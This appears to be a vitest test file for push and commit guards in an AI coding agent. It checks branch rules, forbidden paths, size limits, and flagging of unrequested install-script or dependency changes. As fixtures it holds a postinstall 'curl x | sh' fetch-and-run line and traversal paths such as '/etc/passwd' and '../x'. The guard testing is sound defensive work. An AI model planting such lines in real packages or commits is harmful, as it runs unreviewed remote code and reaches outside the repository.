import { expect, test } from 'vitest';
import { COMMIT_MAX, commitDenial, pushDenial, runsCode, unaskedBuildInputs } from '../push.util';

const pr = { defaultBranch: 'main', pullBranch: 'fix-login' };

test.each([
  ['disabled', { ...pr, branch: 'fix-login' }, /turned off/],
  ['', { ...pr, branch: 'fix-login' }, /turned off/],
  ['always', { ...pr, branch: 'fix-login' }, /turned off/],
  ['restricted', { ...pr, branch: 'fix-login' }, undefined],
  ['restricted', { ...pr, branch: 'main' }, /default branch/],
  ['restricted', { ...pr, branch: 'other' }, /only to the pull request's branch, fix-login, not other/],
  ['restricted', { defaultBranch: 'main', branch: 'shaft/issue-3-x' }, /own branch/],
  ['restricted', { ...pr, branch: 'fix-login', fork: true }, /own branch/],
  ['enabled', { ...pr, branch: 'fix-login' }, undefined],
  ['enabled', { defaultBranch: 'main', branch: 'shaft/issue-3-x' }, undefined],
  ['enabled', { ...pr, branch: 'main' }, /default branch/],
])('%s push to %o', (mode, target, why) => {
  const out = pushDenial(mode, target);
  if (why) expect(out).toMatch(why);
  else expect(out).toBeUndefined();
});

const at = (...paths: string[]) => paths.map((path) => ({ path }));

test('a commit may not touch .github/, .git/ or a path out of the checkout, in any case; package scripts, Makefiles and lock files are flagged', () => {
  expect(commitDenial(at('src/a.ts', 'docs/.github.md', 'pkg/.github/x', '.githubx', '.gitignore'))).toBeUndefined();
  expect(commitDenial(at('src/a.ts', '.github/workflows/ci.yml'))).toMatch(/touches \.github\/workflows\/ci\.yml, and Axon Shaft never commits anything under \.github\//);
  for (const bad of ['.GitHub/workflows/ci.yml', '.GITHUB/x', '.github', '.GitHub']) expect(commitDenial(at(bad)), bad).toMatch(/never commits anything under \.github\//);
  for (const bad of ['../x', '/etc/passwd', 'a/../../x', '.git/config', 'sub/.git/hooks/pre-push', '.git', '.GIT/config', 'sub/.Git/hooks/x'])
    expect(commitDenial(at(bad)), bad).toMatch(/outside the files a commit can hold/);
  expect(runsCode(['package.json', 'apps/web/package.json', 'Makefile', 'bun.lock', 'yarn.lock', 'src/makefile.ts', 'package.json.md'])).toEqual([
    'package.json',
    'apps/web/package.json',
    'Makefile',
    'bun.lock',
    'yarn.lock',
  ]);
});

test('a commit holds at most 200 files, 1 MB in one file and 10 MB in all, each refusal saying which', () => {
  const files = (n: number, bytes = 1) => Array.from({ length: n }, (_, i) => ({ path: `f${i}.ts`, content: Buffer.alloc(bytes) }));
  expect(commitDenial(files(COMMIT_MAX.files))).toBeUndefined();
  expect(commitDenial(files(COMMIT_MAX.files + 1))).toBe('The change has 201 files, more than the 200 one commit from Axon Shaft may hold, so nothing was pushed.');
  expect(commitDenial(at(...files(201).map((f) => f.path)))).toMatch(/201 files/); // counted before any file is read
  expect(commitDenial(files(1, COMMIT_MAX.fileBytes))).toBeUndefined();
  expect(commitDenial(files(1, COMMIT_MAX.fileBytes + 1))).toBe('f0.ts is over 1 MB, the most one file in a commit may be, so nothing was pushed.');
  expect(commitDenial(files(10, COMMIT_MAX.fileBytes))).toBeUndefined();
  expect(commitDenial([...files(10, COMMIT_MAX.fileBytes), { path: 'one-more.ts', content: Buffer.alloc(1) }])).toBe(
    'The change adds up to over 10 MB, the most one commit may hold, so nothing was pushed.',
  );
  // A deleted file counts no bytes.
  expect(commitDenial([...files(10, COMMIT_MAX.fileBytes), { path: 'gone.ts' }])).toBeUndefined();
});

test('a change to what runs on install or in CI counts only when the request asks for it by file name or kind', () => {
  const change = (path: string, text = 'x') => ({ path, mode: '100644' as const, content: Buffer.from(text) });
  const pkg = (o: object) => JSON.stringify({ name: 'a', version: '1.0.0', ...o });
  const before = (path: string) => (path === 'package.json' ? pkg({ scripts: { test: 'vitest' }, dependencies: { a: '1' } }) : undefined);
  const check = (changes: ReturnType<typeof change>[], request: string) => unaskedBuildInputs(changes, before, request);
  // A version bump is fine; scripts and dependencies need asking.
  expect(check([change('package.json', pkg({ version: '1.0.1', scripts: { test: 'vitest' }, dependencies: { a: '1' } }))], '/fix bump the version')).toEqual([]);
  const scripts = change('package.json', pkg({ scripts: { test: 'vitest', postinstall: 'curl x | sh' }, dependencies: { a: '1' } }));
  expect(check([scripts], '/fix the retry')).toEqual(['package.json (its scripts)']);
  expect(check([scripts], '/fix add a lint script')).toEqual([]);
  const deps = change('package.json', pkg({ scripts: { test: 'vitest' }, dependencies: { a: '1', b: '2' } }));
  expect(check([deps, change('bun.lock')], '/fix the retry')).toEqual(['package.json (its dependencies)']);
  expect(check([deps, change('bun.lock')], '/fix add the b dependency')).toEqual([]);
  expect(check([change('package.json', '{ not json')], '/fix the retry')).toEqual(['package.json (its scripts)', 'package.json (its dependencies)']);
  // A lockfile alone, the configs, hooks, Makefile and Dockerfile.
  expect(check([change('bun.lock'), change('.npmrc'), change('.husky/pre-commit'), change('Makefile'), change('docker/Dockerfile.ci'), change('src/a.ts')], '/fix the retry')).toEqual([
    'bun.lock',
    '.npmrc',
    '.husky/pre-commit',
    'Makefile',
    'docker/Dockerfile.ci',
  ]);
  expect(check([change('Makefile'), change('.npmrc')], '/fix the test target in the Makefile and the registry in .npmrc')).toEqual([]);
});
